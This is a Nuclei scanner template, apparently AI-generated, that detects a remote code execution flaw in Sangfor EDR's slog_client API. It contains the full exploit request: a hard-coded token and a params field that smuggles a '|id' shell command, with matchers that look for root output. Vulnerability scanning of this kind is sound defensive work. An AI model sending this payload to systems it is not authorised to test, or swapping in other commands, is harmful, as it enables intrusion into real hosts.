id: sangfor-edr-slog-client-rce

info:
  name: Sangfor EDR slog_client RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects a remote code execution vulnerability in Sangfor EDR's slog_client endpoint.
  reference:
    - https://www.cnblogs.com/0day-li/p/13650452.html

http:
  - raw:
      - |
        POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {"params":"w=123\"''1234123''\"|id"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid=0(root)"
      - type: word
        part: header
        words:
          - "application/json"
